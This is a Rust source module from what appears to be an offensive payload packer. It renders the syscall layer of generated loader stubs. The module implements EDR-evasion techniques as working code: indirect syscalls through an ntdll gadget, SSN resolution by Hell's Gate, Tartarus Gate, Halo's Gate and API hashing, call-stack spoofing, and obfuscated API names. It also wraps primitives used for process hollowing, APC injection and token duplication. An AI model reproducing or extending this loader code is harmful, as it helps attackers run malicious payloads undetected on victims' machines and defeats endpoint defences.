//! Syscall layer configuration and stub rendering.
//!
//! `build.stub.syscalls` (YAML) selects how the generated stub talks to the
//! kernel. It is a *loader* concern, not a pipeline technique: it changes how the
//! stub
//! invokes primitives, not how the payload runs. Two modes exist:
//!
//! - [`SyscallsMode::None`]: the technique fragments call the same `nt_*`
//!   helpers, but the helpers map to the plain Win32 APIs.
//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime (Hell's
//!   Gate from the live ntdll, Tartarus Gate from a clean copy read from disk,
//!   or API hashing matching each export by a precomputed FNV-1a hash) and
//!   invoke the kernel through the `syscall; ret` gadget in ntdll's `.text`,
//!   so the suspicious Win32 imports never appear in the IAT.
//!
//! The fragment contract is: technique fragments always call the `nt_*`
//! helpers (never the Win32 APIs directly), and the helper implementation
//! depends on the mode. A fragment never knows whether syscalls are active.
//!
//! The SSN table only contains the functions the active techniques need:
//! `TechniqueDef::syscalls` lists each technique's Nt* requirements and the
//! union (in the canonical [`NT_FUNCTIONS`] order) is what the stub resolves.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::error::{PackerError, Result};
use crate::techniques::RuntimeStep;

use super::obfuscation::StringsConfig;

mod helpers;
mod pe_file;
mod prelude;
pub mod resolvers;
pub mod stack_spoofing;

use helpers::*;

/// Raw `build.stub.syscalls` YAML block, before semantic validation.
///
/// `mode` and `resolver` are kept as plain strings here so that
/// [`SyscallsConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSyscallsPlan {
    /// Syscall mode (`none` or `indirect`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// SSN resolver (`hells_gate` or `tartarus_gate`).
    #[serde(default = "default_resolver")]
    pub resolver: String,

    /// Fabricate ntdll-shaped frames around every indirect syscall.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stack_spoofing: Option<YamlStackSpoofing>,
}

/// `build.stub.syscalls.stack_spoofing`: the stack half of the syscall layer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlStackSpoofing {
    /// Bytes of decoy stack written below `Rsp` before every syscall.
    #[serde(default = "stack_spoofing::default_decoy_bytes")]
    pub decoy_bytes: usize,
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_resolver() -> String {
    "hells_gate".to_string()
}

/// How the stub invokes the kernel.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallsMode {
    /// Plain Win32 calls; the helpers wrap the Win32 APIs directly.
    None,
    /// Indirect syscalls with runtime SSN resolution.
    Indirect,
}

impl SyscallsMode {
    /// Lowercase label used in the build summary.
    pub fn label(self) -> &'static str {
        match self {
            SyscallsMode::None => "none",
            SyscallsMode::Indirect => "indirect",
        }
    }
}

/// SSN resolution strategy for `mode: indirect`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Resolver {
    /// Hell's Gate: read the SSN from the Nt* stub prologue in the live ntdll.
    /// Fails with a clear error when an EDR has hooked the export stub.
    HellsGate,
    /// Tartarus Gate: read the SSN from a clean copy of ntdll read from disk,
    /// so hooks in the live ntdll's export stubs do not hide the SSN.
    TartarusGate,
    /// API hashing: resolve each SSN by a precomputed FNV-1a hash of its name,
    /// walking a clean copy of ntdll read from disk, so neither `GetProcAddress`
    /// nor any function-name string is needed.
    ApiHash,
    /// Halo's Gate: read the SSN from the live export stub when it is intact
    /// and derive it from the nearest intact neighbour when an EDR hooked it.
    HalosGate,
}

impl Resolver {
    /// Lowercase label used in the verbose build output.
    pub fn label(self) -> &'static str {
        match self {
            Resolver::HellsGate => "hells_gate",
            Resolver::TartarusGate => "tartarus_gate",
            Resolver::ApiHash => "api_hash",
            Resolver::HalosGate => "halos_gate",
        }
    }
}

/// Resolved syscall-layer configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SyscallsConfig {
    /// How the stub invokes the kernel.
    pub mode: SyscallsMode,
    /// How the SSNs are resolved when the mode is `indirect`.
    pub resolver: Resolver,
    /// Fabricate ntdll-shaped frames around every indirect syscall.
    pub stack_spoofing: Option<stack_spoofing::Params>,
}

impl Default for SyscallsConfig {
    fn default() -> Self {
        Self {
            mode: SyscallsMode::None,
            resolver: Resolver::HellsGate,
            stack_spoofing: None,
        }
    }
}

impl SyscallsConfig {
    /// Resolves the syscall plan from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `resolver: hells_gate`). An
    /// unknown mode or resolver is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlSyscallsPlan>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => SyscallsMode::None,
            "indirect" => SyscallsMode::Indirect,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.mode '{other}': expected 'none' or 'indirect'"
                )));
            }
        };

        let resolver = match yaml.resolver.as_str() {
            "hells_gate" => Resolver::HellsGate,
            "tartarus_gate" => Resolver::TartarusGate,
            "api_hash" => Resolver::ApiHash,
            "halos_gate" => Resolver::HalosGate,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate', \
                     'tartarus_gate', 'api_hash' or 'halos_gate'"
                )));
            }
        };

        let stack_spoofing = match &yaml.stack_spoofing {
            Some(spoofing) => {
                if mode != SyscallsMode::Indirect {
                    return Err(PackerError::Validation(
                        "build.stub.syscalls.stack_spoofing requires \
                         'build.stub.syscalls.mode: indirect': it rewrites the indirect trampoline, \
                         which 'none' does not emit"
                            .to_string(),
                    ));
                }
                Some(stack_spoofing::Params {
                    decoy_bytes: spoofing.decoy_bytes,
                })
            }
            None => None,
        };

        Ok(Self {
            mode,
            resolver,
            stack_spoofing,
        })
    }
}

/// One Nt* function the stub can invoke through the syscall layer.
struct NtFunction {
    /// Export name in ntdll (obfuscated with [`StringsConfig`] at render time).
    name: &'static str,
    /// Field of the generated `SsnTable` holding this function's SSN.
    table_field: &'static str,
    /// Name of the generated helper the technique fragments call.
    helper_name: &'static str,
    /// Helper body for `mode: none` (direct Win32 call).
    helper_none: &'static str,
    /// Helper body for `mode: indirect` (syscall through the gadget).
    helper_indirect: &'static str,
    /// Native signature for a generated direct `ntdll!Nt*` proxy, when the
    /// helper can back one (see [`NtProxyInfo`]).
    proxy: Option<NtProxyInfo>,
}

/// Native signature for a generated direct `ntdll!Nt*` proxy.
///
/// Present only when the helper's parameters are a faithful match for the
/// export (or reachable with a small forwarding expression). A helper that is a
/// lossy convenience wrapper over the native call — one that takes milliseconds
/// where the export takes a `LARGE_INTEGER`, or drops part of the native
/// argument list — cannot back a direct proxy and carries `proxy: None`.
#[derive(Clone, Copy)]
pub(crate) struct NtProxyInfo {
    /// The generated helper the proxy calls.
    pub(crate) helper_name: &'static str,
    /// Native `(name, type)` parameters for the `extern "system"` wrapper.
    pub(crate) params: &'static [(&'static str, &'static str)],
    /// Argument expressions forwarded to the helper.
    pub(crate) forward: &'static str,
}

/// The direct-proxy signature for `name`, if the helper can back one.
pub(crate) fn nt_proxy_info(name: &str) -> Option<NtProxyInfo> {
    NT_FUNCTIONS
        .iter()
        .find(|f| f.name == name)
        .and_then(|f| f.proxy)
}

/// The `Nt*` names a generated direct proxy can be emitted for.
pub(crate) fn nt_proxy_names() -> Vec<&'static str> {
    NT_FUNCTIONS
        .iter()
        .filter(|f| f.proxy.is_some())
        .map(|f| f.name)
        .collect()
}

const NT_FUNCTIONS: &[NtFunction] = &[
    NtFunction {
        name: "NtAllocateVirtualMemory",
        table_field: "alloc_vm",
        helper_name: "nt_alloc_vm",
        helper_none: ALLOC_VM_NONE,
        helper_indirect: ALLOC_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_alloc_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", "*mut *mut core::ffi::c_void"),
                ("zero_bits", "usize"),
                ("size", "*mut usize"),
                ("alloc_type", "u32"),
                ("protect", "u32"),
            ],
            forward: "process, base, zero_bits, size, alloc_type, protect",
        }),
    },
    NtFunction {
        name: "NtWriteVirtualMemory",
        table_field: "write_vm",
        helper_name: "nt_write_vm",
        helper_none: WRITE_VM_NONE,
        helper_indirect: WRITE_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_write_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", P_CVOID),
                ("buffer", P_CVOID),
                ("size", "usize"),
                ("written", "*mut usize"),
            ],
            forward: "process, base, buffer, size, written",
        }),
    },
    NtFunction {
        name: "NtReadVirtualMemory",
        table_field: "read_vm",
        helper_name: "nt_read_vm",
        helper_none: READ_VM_NONE,
        helper_indirect: READ_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_read_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", P_CVOID),
                ("buffer", P_PVOID),
                ("size", "usize"),
                ("read", "*mut usize"),
            ],
            forward: "process, base, buffer, size, read",
        }),
    },
    NtFunction {
        name: "NtResumeThread",
        table_field: "resume_thread",
        helper_name: "nt_resume_thread",
        helper_none: RESUME_THREAD_NONE,
        helper_indirect: RESUME_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_resume_thread",
            params: &[("thread", P_HANDLE), ("previous", "*mut u32")],
            forward: "thread, previous",
        }),
    },
    NtFunction {
        name: "NtUnmapViewOfSection",
        table_field: "unmap_view",
        helper_name: "nt_unmap_view",
        helper_none: UNMAP_VIEW_NONE,
        helper_indirect: UNMAP_VIEW_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_unmap_view",
            params: &[("process", P_HANDLE), ("base", P_PVOID)],
            forward: "process, base",
        }),
    },
    NtFunction {
        name: "NtProtectVirtualMemory",
        table_field: "protect_vm",
        helper_name: "nt_protect_vm",
        helper_none: PROTECT_VM_NONE,
        helper_indirect: PROTECT_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_protect_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", "*mut *mut core::ffi::c_void"),
                ("size", "*mut usize"),
                ("new_protect", "u32"),
                ("old_protect", "*mut u32"),
            ],
            forward: "process, unsafe { *base }, unsafe { *size }, new_protect, old_protect",
        }),
    },
    NtFunction {
        name: "NtFreeVirtualMemory",
        table_field: "free_vm",
        helper_name: "nt_free_vm",
        helper_none: FREE_VM_NONE,
        helper_indirect: FREE_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_free_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", "*mut *mut core::ffi::c_void"),
                ("size", "*mut usize"),
                ("free_type", "u32"),
            ],
            forward: "process, base, size, free_type",
        }),
    },
    NtFunction {
        name: "NtSuspendThread",
        table_field: "suspend_thread",
        helper_name: "nt_suspend_thread",
        helper_none: SUSPEND_THREAD_NONE,
        helper_indirect: SUSPEND_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_suspend_thread",
            params: &[("thread", P_HANDLE), ("previous", "*mut u32")],
            forward: "thread, previous",
        }),
    },
    NtFunction {
        name: "NtQueryInformationProcess",
        table_field: "query_info_process",
        helper_name: "nt_query_info_process",
        helper_none: QUERY_INFO_PROCESS_NONE,
        helper_indirect: QUERY_INFO_PROCESS_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_query_info_process",
            params: &[
                ("process", P_HANDLE),
                ("info_class", "i32"),
                ("info", P_PVOID),
                ("info_len", "u32"),
                ("return_len", "*mut u32"),
            ],
            forward: "process, info_class, info, info_len, return_len",
        }),
    },
    NtFunction {
        name: "NtGetContextThread",
        table_field: "get_context_thread",
        helper_name: "nt_get_context_thread",
        helper_none: GET_CONTEXT_THREAD_NONE,
        helper_indirect: GET_CONTEXT_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_get_context_thread",
            params: &[("thread", P_HANDLE), ("context", P_PVOID)],
            forward: "thread, context",
        }),
    },
    NtFunction {
        name: "NtSetContextThread",
        table_field: "set_context_thread",
        helper_name: "nt_set_context_thread",
        helper_none: SET_CONTEXT_THREAD_NONE,
        helper_indirect: SET_CONTEXT_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_set_context_thread",
            params: &[("thread", P_HANDLE), ("context", P_PVOID)],
            forward: "thread, context",
        }),
    },
    NtFunction {
        name: "NtCreateThreadEx",
        table_field: "create_thread_ex",
        helper_name: "nt_create_thread_ex",
        helper_none: CREATE_THREAD_EX_NONE,
        helper_indirect: CREATE_THREAD_EX_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_create_thread_ex_native",
            params: &[
                ("thread", "*mut windows::Win32::Foundation::HANDLE"),
                ("desired_access", "u32"),
                ("object_attributes", P_CVOID),
                ("process", P_HANDLE),
                ("start", P_PVOID),
                ("argument", P_PVOID),
                ("create_flags", "u32"),
                ("zero_bits", "usize"),
                ("stack_size", "usize"),
                ("maximum_stack_size", "usize"),
                ("attribute_list", P_CVOID),
            ],
            forward: "thread, desired_access, object_attributes, process, start, argument, create_flags, zero_bits, stack_size, maximum_stack_size, attribute_list",
        }),
    },
    NtFunction {
        name: "NtWaitForSingleObject",
        table_field: "wait_for_single_object",
        helper_name: "nt_wait_for_single_object",
        helper_none: WAIT_FOR_SINGLE_OBJECT_NONE,
        helper_indirect: WAIT_FOR_SINGLE_OBJECT_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_wait_for_single_object_native",
            params: &[
                ("handle", P_HANDLE),
                ("alertable", "u8"),
                ("timeout", "*const i64"),
            ],
            forward: "handle, alertable, timeout",
        }),
    },
    NtFunction {
        name: "NtQueryInformationThread",
        table_field: "query_info_thread",
        helper_name: "nt_query_info_thread",
        helper_none: QUERY_INFO_THREAD_NONE,
        helper_indirect: QUERY_INFO_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_query_info_thread",
            params: &[
                ("thread", P_HANDLE),
                ("info_class", "i32"),
                ("info", P_PVOID),
                ("info_len", "u32"),
                ("return_len", "*mut u32"),
            ],
            forward: "thread, info_class, info, info_len, return_len",
        }),
    },
    NtFunction {
        name: "NtClose",
        table_field: "close",
        helper_name: "nt_close",
        helper_none: CLOSE_NONE,
        helper_indirect: CLOSE_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_close",
            params: &[("handle", P_HANDLE)],
            forward: "handle",
        }),
    },
    NtFunction {
        name: "NtDelayExecution",
        table_field: "delay_execution",
        helper_name: "nt_delay_execution",
        helper_none: DELAY_EXECUTION_NONE,
        helper_indirect: DELAY_EXECUTION_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_delay_execution",
            params: &[("alertable", "u8"), ("interval", "*const i64")],
            forward: "alertable, interval",
        }),
    },
    NtFunction {
        name: "NtQueryVirtualMemory",
        table_field: "query_vm",
        helper_name: "nt_query_vm",
        helper_none: QUERY_VM_NONE,
        helper_indirect: QUERY_VM_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_query_vm",
            params: &[
                ("process", P_HANDLE),
                ("base", P_CVOID),
                ("class", "u32"),
                ("info", P_PVOID),
                ("info_len", "usize"),
                ("return_len", "*mut usize"),
            ],
            forward: "process, base, class, info, info_len, return_len",
        }),
    },
    NtFunction {
        name: "NtOpenThreadToken",
        table_field: "open_thread_token",
        helper_name: "nt_open_thread_token",
        helper_none: OPEN_THREAD_TOKEN_NONE,
        helper_indirect: OPEN_THREAD_TOKEN_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_open_thread_token",
            params: &[
                ("thread", P_HANDLE),
                ("access", "u32"),
                ("open_as_self", "u8"),
                ("token", P_PVOID),
            ],
            forward: "thread, access, open_as_self, token",
        }),
    },
    NtFunction {
        name: "NtOpenProcess",
        table_field: "open_process",
        helper_name: "nt_open_process",
        helper_none: OPEN_PROCESS_NONE,
        helper_indirect: OPEN_PROCESS_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_open_process",
            params: &[
                ("handle", P_PVOID),
                ("access", "u32"),
                ("attributes", P_CVOID),
                ("client_id", P_CVOID),
            ],
            forward: "handle, access, attributes, client_id",
        }),
    },
    NtFunction {
        name: "NtOpenProcessToken",
        table_field: "open_process_token",
        helper_name: "nt_open_process_token",
        helper_none: OPEN_PROCESS_TOKEN_NONE,
        helper_indirect: OPEN_PROCESS_TOKEN_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_open_process_token",
            params: &[
                ("process", P_HANDLE),
                ("access", "u32"),
                ("token", P_PVOID),
            ],
            forward: "process, access, token",
        }),
    },
    NtFunction {
        name: "NtDuplicateToken",
        table_field: "duplicate_token",
        helper_name: "nt_duplicate_token",
        helper_none: DUPLICATE_TOKEN_NONE,
        helper_indirect: DUPLICATE_TOKEN_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_duplicate_token",
            params: &[
                ("existing", P_HANDLE),
                ("access", "u32"),
                ("attributes", P_CVOID),
                ("effective_only", "u8"),
                ("token_type", "i32"),
                ("new_token", P_PVOID),
            ],
            forward: "existing, access, attributes, effective_only, token_type, new_token",
        }),
    },
    NtFunction {
        name: "NtQueueApcThread",
        table_field: "queue_apc",
        helper_name: "nt_queue_apc",
        helper_none: QUEUE_APC_NONE,
        helper_indirect: QUEUE_APC_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_queue_apc",
            params: &[
                ("thread", P_HANDLE),
                ("routine", P_CVOID),
                ("argument1", P_PVOID),
                ("argument2", P_PVOID),
                ("argument3", P_PVOID),
            ],
            forward: "thread, routine, argument1, argument2, argument3",
        }),
    },
    NtFunction {
        name: "NtSetInformationFile",
        table_field: "set_info_file",
        helper_name: "nt_set_info_file",
        helper_none: SET_INFO_FILE_NONE,
        helper_indirect: SET_INFO_FILE_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_set_info_file",
            params: &[
                ("file", P_HANDLE),
                ("io_status", P_PVOID),
                ("info", P_CVOID),
                ("length", "u32"),
                ("class", "i32"),
            ],
            forward: "file, io_status, info, length, class",
        }),
    },
    NtFunction {
        name: "NtSetInformationThread",
        table_field: "set_info_thread",
        helper_name: "nt_set_info_thread",
        helper_none: SET_INFO_THREAD_NONE,
        helper_indirect: SET_INFO_THREAD_INDIRECT,
        proxy: Some(NtProxyInfo {
            helper_name: "nt_set_info_thread",
            params: &[
                ("thread", P_HANDLE),
                ("class", "i32"),
                ("info", P_CVOID),
                ("length", "u32"),
            ],
            forward: "thread, class, info, length",
        }),
    },
];

/// The Nt* function names the active techniques need, deduplicated and in the
/// canonical [`NT_FUNCTIONS`] order.
///
/// Techniques not in the pipeline contribute nothing, so their SSNs are never
/// resolved (and their names never emitted) — less work at startup and fewer
/// strings in the binary.
pub fn required(pipeline: &[RuntimeStep]) -> Vec<&'static str> {
    required_functions(pipeline)
        .into_iter()
        .map(|f| f.name)
        .collect()
}

/// The full [`NtFunction`] records the active techniques need.
fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
    required_functions_with(pipeline, &[])
}

/// The full [`NtFunction`] records the active techniques plus any extra `Nt*`
/// names need (e.g. the ones `build.stub.api_resolution` routes to).
fn required_functions_with(
    pipeline: &[RuntimeStep],
    extra_nt: &[&'static str],
) -> Vec<&'static NtFunction> {
    let mut needed: BTreeSet<&str> = BTreeSet::new();
    for step in pipeline {
        if let Some(def) = crate::techniques::find(step.name()) {
            needed.extend(def.syscalls.iter().copied());
        }
    }
    needed.extend(extra_nt.iter().copied());
    NT_FUNCTIONS
        .iter()
        .filter(|f| needed.contains(f.name))
        .collect()
}

/// Renders the `$SYSCALLS_BLOCK$` fragment for the given runtime.
///
/// - No active technique needs syscalls: a no-op `init_syscalls`.
/// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
/// - `mode: indirect`: the full syscall layer (SSN table, resolver — Hell's
///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
///   the helpers.
///
/// `extra_nt` pulls in the `Nt*` helpers the selected `build.stub.api_resolution`
/// proxies route to.
pub fn render_block_with(
    plan: &SyscallsConfig,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    extra_nt: &[&'static str],
    seed: u64,
) -> String {
    let required = required_functions_with(pipeline, extra_nt);
    if required.is_empty() {
        return assemble(
            "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
            prelude::EMPTY_BODY,
            &["init_syscalls"],
        );
    }

    let (header, body) = match plan.mode {
        SyscallsMode::None => (
            "// --- Syscall layer (build.stub.syscalls.mode = none) ---\n// Direct Win32 calls: the \
             fragments always call the nt_* helpers, which map to\n// the Win32 APIs below. The \
             DLL/function names are rebuilt at runtime from\n// obfuscated bytes injected by the \
             packer."
                .to_string(),
            render_none(&required, strings),
        ),
        SyscallsMode::Indirect => {
            let resolver = plan.resolver.label();
            (
                format!(
                    "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = {resolver}) ---\n// \
                     Indirect syscalls with {resolver} SSN resolution. The Nt* names never\n// appear in \
                     the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                     api_hash replaces them with precomputed FNV-1a hashes, and\n// Halo's Gate derives a \
                     hooked SSN from its neighbours.\n// See docs/techniques/indirect_syscalls.md."
                ),
                render_indirect(
                    plan,
                    &required,
                    strings,
                    plan.stack_spoofing
                        .map(|params| params.render_fragment(strings)),
                    seed,
                ),
            )
        }
    };

    let mut reexports: Vec<&str> = std::iter::once("init_syscalls")
        .chain(required.iter().map(|f| f.helper_name))
        .collect();
    // The native-signature helpers (indirect only) are re-exported so the
    // generated direct proxies can call them.
    if matches!(plan.mode, SyscallsMode::Indirect) {
        for f in &required {
            if let Some((helper, _)) = native_proxy_helper(f.name) {
                reexports.push(helper);
            }
        }
    }
    assemble(&header, &body, &reexports)
}

/// Wraps the rendered body in `mod syscalls { ... }` and re-exports the
/// helpers the fragments call through `crate::`.
fn assemble(header: &str, body: &str, reexports: &[&str]) -> String {
    let mut block = format!("{header}\nmod syscalls {{\n{body}}}\n");
    block.push_str(&format!("use syscalls::{{{}}};\n", reexports.join(", ")));
    block
}

/// Renders the `mode: none` body: the prelude plus the direct helpers for the
/// required functions.
fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");
    let unmap_def = strings
        .obfuscate("NtUnmapViewOfSection")
        .render_stub_expr("unmap_func");
    let open_process_def = strings
        .obfuscate("NtOpenProcess")
        .render_stub_expr("open_process_func");
    let query_def = strings
        .obfuscate("NtQueryInformationProcess")
        .render_stub_expr("query_info_name");
    let get_context_def = strings
        .obfuscate("NtGetContextThread")
        .render_stub_expr("get_context_name");
    let set_context_def = strings
        .obfuscate("NtSetContextThread")
        .render_stub_expr("set_context_name");
    let query_thread_def = strings
        .obfuscate("NtQueryInformationThread")
        .render_stub_expr("query_thread_name");
    let set_info_file_def = strings
        .obfuscate("NtSetInformationFile")
        .render_stub_expr("set_info_file_name");
    let set_info_thread_def = strings
        .obfuscate("NtSetInformationThread")
        .render_stub_expr("set_info_thread_name");
    let delay_def = strings
        .obfuscate("NtDelayExecution")
        .render_stub_expr("delay_execution_name");
    let query_vm_def = strings
        .obfuscate("NtQueryVirtualMemory")
        .render_stub_expr("query_vm_name");
    let open_process_token_def = strings
        .obfuscate("NtOpenProcessToken")
        .render_stub_expr("open_process_token_name");
    let duplicate_token_def = strings
        .obfuscate("NtDuplicateToken")
        .render_stub_expr("duplicate_token_name");

    let mut out = String::from(prelude::NONE_PRELUDE);
    for f in required {
        out.push_str(f.helper_none);
        out.push('\n');
    }
    out.replace("$NTDLL_DEF$", &ntdll_def)
        .replace("$UNMAP_FUNC_DEF$", &unmap_def)
        .replace("$OPEN_PROCESS_FUNC_DEF$", &open_process_def)
        .replace("$QUERY_FUNC_DEF$", &query_def)
        .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
        .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
        .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
        .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
        .replace("$SET_INFO_THREAD_FUNC_DEF$", &set_info_thread_def)
        .replace("$DELAY_FUNC_DEF$", &delay_def)
        .replace("$QUERY_VM_FUNC_DEF$", &query_vm_def)
        .replace("$OPEN_PROCESS_TOKEN_FUNC_DEF$", &open_process_token_def)
        .replace("$DUPLICATE_TOKEN_FUNC_DEF$", &duplicate_token_def)
}

/// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
/// initializers and the selected resolver's resolution lines) plus the indirect
/// helpers.
fn render_indirect(
    plan: &SyscallsConfig,
    required: &[&'static NtFunction],
    strings: &StringsConfig,
    spoofing: Option<String>,
    seed: u64,
) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");

    let mut fields = String::new();
    let mut init = String::new();
    let mut resolve_hg = String::new();
    let mut resolve_tg = String::new();
    let mut resolve_ah = String::new();
    let mut helpers = String::new();

    for f in required {
        fields.push_str(&format!("        {}: u32,\n", f.table_field));
        init.push_str(&format!("            {}: 0,\n", f.table_field));

        // The name is rebuilt at runtime from obfuscated bytes; the variable
        // name (e.g. `alloc_vm_name`) is not sensitive. The API-hashing
        // resolver skips it entirely and embeds a precomputed hash instead.
        let name_var = format!("{}_name", f.table_field);
        let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
        resolve_hg.push_str(&format!(
            "        table.{} = resolve_ssn_with_fallback(module, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_tg.push_str(&format!(
            "        table.{} = resolve_ssn(&file, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_ah.push_str(&format!(
            "        table.{} = resolve_ssn(&file, 0x{:016x})?;\n",
            f.table_field,
            resolvers::api_hash::api_hash_with(f.name.as_bytes(), seed)
        ));

        helpers.push_str(f.helper_indirect);
        helpers.push('\n');
        if let Some((_, body)) = native_proxy_helper(f.name) {
            helpers.push_str(body);
            helpers.push('\n');
        }
    }

    // `build.stub.syscalls.stack_spoofing` replaces the raw trampoline with its
    // own `nt_invoke`, so the block is emitted once, below the helpers it drives.
    let spoofing = match spoofing {
        Some(block) => {
            helpers.push_str(&block);
            helpers.push('\n');
            true
        }
        None => false,
    };

    let resolve = match plan.resolver {
        // Hell's Gate and Halo's Gate share the per-function
        // `resolve_ssn_with_fallback` call; the resolver body defines what that
        // helper does.
        Resolver::HellsGate | Resolver::HalosGate => &resolve_hg,
        Resolver::TartarusGate => &resolve_tg,
        Resolver::ApiHash => &resolve_ah,
    };
    let resolver_body = resolvers::render_body(
        plan.resolver,
        init.trim_end(),
        resolve.trim_end(),
        &ntdll_def,
        seed,
    );

    let mut out = prelude::INDIRECT_PRELUDE
        .replace("$SSN_FIELDS$", fields.trim_end())
        .replace("$RESOLVER_BODY$", &resolver_body)
        .replace(
            "$SPOOFING_INIT$",
            if spoofing {
                "        init_stack_spoofing().map_err(|e| e.to_string())?;"
            } else {
                ""
            },
        )
        .replace(
            "$TRAMPOLINE_NAME$",
            if spoofing {
                "nt_invoke_raw"
            } else {
                "nt_invoke"
            },
        );
    out.push_str(&helpers);
    out
}

// The stack-spoofing block is rendered from the syscall configuration itself
// (`build.stub.syscalls.stack_spoofing`); it replaces the trampoline instead of
// running at a position, so it has no `runtime:` step.

/// Extracts the SSN from a Hell's Gate stub prologue.
///
/// Returns `Some(ssn)` when `bytes` starts with the canonical prologue
/// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`), and `None`
/// otherwise (hooked or otherwise altered stub). This mirrors the resolver
/// embedded in the generated stub, so the parsing behavior is unit-tested
/// here instead of on a live ntdll.
#[cfg(test)]
pub fn parse_ssn_prologue(bytes: &[u8]) -> Option<u32> {
    const PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8]; // mov r10, rcx; mov eax, imm32
    if bytes.len() < 8 || bytes[..4] != PROLOGUE {
        return None;
    }
    Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
}

/// Returns the offset of the first `syscall` followed by a return (`0F 05 C3`
/// or `0F 05 CB`) in `bytes`, if any. Mirrors the generated stub's gadget
/// scanner (`prelude::INDIRECT_PRELUDE`), so the matching behavior is
/// unit-tested here instead of on a live ntdll.
#[cfg(test)]
pub fn find_gadget_offset(bytes: &[u8]) -> Option<usize> {
    bytes
        .windows(3)
        .position(|w| w[0] == 0x0F && w[1] == 0x05 && (w[2] == 0xC3 || w[2] == 0xCB))
}

#[cfg(test)]
mod tests;
